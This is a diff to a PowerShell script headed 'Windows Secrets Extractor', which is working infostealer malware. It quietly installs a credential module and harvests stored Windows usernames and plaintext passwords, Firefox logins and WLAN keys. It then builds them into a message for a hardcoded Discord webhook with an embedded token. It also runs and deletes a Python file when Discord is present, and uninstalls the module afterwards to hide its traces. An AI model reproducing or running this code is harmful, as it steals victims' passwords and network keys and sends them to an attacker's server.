@@ -1,20 +1,26 @@
+# Windows Secrets Extractor
 
-try {
+$webHookUrl = "https://discord.com/api/webhooks/873647888645898241/VCtL2QCQmdXnKceEYRQrApF9HNKmn8JLTCYjlYYu33pI5bfKRjb95Y0Cp20B85qatyc6"
+
+
+if (Get-Module -ListAvailable -Name CredentialManager) {
     Import-Module -Name CredentialManager
-    $crdMgr = $true
-} catch {
+    $crdMgr = $True
+    $crdMgrInstalledByScript = $False
+} else {
     Write-Host "Missing CredentialManager module..." -ForegroundColor "yellow"
-    try {
-        set-psRepository -name PSGallery -installationPolicy trusted
-        Install-Module -Name CredentialManager -Scope CurrentUser -Confirm:$false -Repository PSGallery
-    } catch {
-        # Impossible to load CredentialManager Module :(
-        $crdMgr = $false
+    set-psRepository -name PSGallery -installationPolicy trusted
+    Install-Module -Name CredentialManager -Scope CurrentUser -Confirm:$false -Repository PSGallery
+    if (Get-Module -ListAvailable -Name CredentialManager) {
+        Import-Module -Name CredentialManager
+        $crdMgr = $True
+        Write-Host "Module has been installed by script" -ForegroundColor "Green"
+        $crdMgrInstalledByScript = $True
+    } else {
+        $crdMgr = $False
     }
 }
 
-
-$webHookUrl = "https://discord.com/api/webhooks/873647888645898241/VCtL2QCQmdXnKceEYRQrApF9HNKmn8JLTCYjlYYu33pI5bfKRjb95Y0Cp20B85qatyc6"
 
 function IsInstalled($appName){
     $AppToCheck = '`'+$appName+'*'
@@ -66,16 +72,17 @@ function Get-FireFoxCred {
 }
 
 
-# Get Windows Credentials
-if ($crdMgr) {
+function Get-WCREDS {
+    # This function will get windows stored credentials, so we need CredentialManager Module!
     $WCred = @()
-    foreach ($i in Get-StoredCredential){
+    $NoWarningCreds = Get-StoredCredential -WarningAction:SilentlyContinue
+    foreach ($i in $NoWarningCreds){
         $username = $i.UserName
         $Password = $i.GetNetworkCredential().password
         $WCred += New-Object -TypeName psobject -Property @{Username=$username; Password=$Password}
     }
+    return $WCred
 }
-
 
 
 # Get WLAN Keys
@@ -120,13 +127,14 @@ $Body.content += "Manufacturer : $manufacturer"
 
 
 # Getting Windows Credentials
-$Body.content += "```````n:lock:  **Windows Credentials**``````"
-foreach ($cred in $WCred) {
-    $Username = $cred.Username
-    $Password = $cred.Password
-    $Body.content += "$Username"+":"+"$Password`n"
+if ($crdMgr){
+    $Body.content += "```````n:lock:  **Windows Credentials**``````"
+    foreach ($cred in Get-WCREDS) {
+        $Username = $cred.Username
+        $Password = $cred.Password
+        $Body.content += "$Username"+":"+"$Password`n"
+    }
 }
-
 
 
 # Getting FireFox Credentials
@@ -176,5 +184,15 @@ if (IsInstalled -appName "Discord"){
         python $filename
 
         Remove-Item $filename
+    }
+}
+
+
+
+if ($crdMgrInstalledByScript) {
+    try {
+        Uninstall-Module -Name CredentialManager
+    } catch {
+        # An errror occured.
     }
 }
